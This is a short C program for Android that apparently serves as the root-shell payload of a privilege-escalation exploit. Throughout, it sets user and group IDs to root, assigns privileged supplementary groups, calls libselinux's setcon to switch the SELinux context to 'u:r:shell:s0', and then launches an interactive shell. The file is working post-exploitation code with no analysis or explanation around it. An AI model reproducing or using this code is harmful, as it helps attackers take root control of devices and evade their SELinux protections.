#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

#include <dlfcn.h>

#define LOGV(...) { printf(__VA_ARGS__); printf("\n"); fflush(stdout); }

typedef int getcon_t(char ** con);
typedef int setcon_t(const char* con);

int main(int argc, const char **argv)
{
  LOGV("uid %s %d", argv[0], getuid());

  int id = 0;
  if (setresgid(id, id, id))
  {
    printf("setresgid failed: %s\n", strerror(errno));
  }
  if (setresuid(id, id, id)) {
    printf("setresuid failed: %s\n", strerror(errno));
  }

  gid_t groups[] = { 2000, 1004, 1007, 1011, 1015, 1028, 3001, 3002, 3003, 3006 };
  if (setgroups(sizeof(groups)/sizeof(groups[0]), groups) != 0) {
    printf("Unable to set groups: %s", strerror(errno));
  }

  LOGV("uid %d", getuid());

  dlerror();
#ifdef __aarch64__
  void * selinux = dlopen("/system/lib64/libselinux.so", RTLD_LAZY);
#else
  void * selinux = dlopen("/system/lib/libselinux.so", RTLD_LAZY);
#endif
  if (selinux) {
    void * getcon = dlsym(selinux, "getcon");
    const char *error = dlerror();
    if (error) {
      LOGV("dlsym error %s", error);
    } else {
      getcon_t * getcon_p = (getcon_t*)getcon;
      char * secontext;
      int ret = (*getcon_p)(&secontext);
      LOGV("%d %s", ret, secontext);
      void * setcon = dlsym(selinux, "setcon");
      const char *error = dlerror();
      if (error) {
        LOGV("dlsym setcon error %s", error);
      } else {
        setcon_t * setcon_p = (setcon_t*)setcon;
        int ret1 = (*setcon_p)("u:r:shell:s0");
        ret = (*getcon_p)(&secontext);
        LOGV("context %d %d %s", ret, ret1, secontext);
        // int ret1 = (*setcon_p)("u:r:untrusted_app:s0");
        // LOGV("ret %d", ret1);
        // ret1 = (*setcon_p)("u:r:shell:s0");
        // ret = (*getcon_p)(&secontext);
        // LOGV("context %d %d %s", ret, ret1, secontext);
      }
    }
    dlclose(selinux);
  } else {
    LOGV("no selinux?");
  }

  system("/system/bin/sh -i");
}
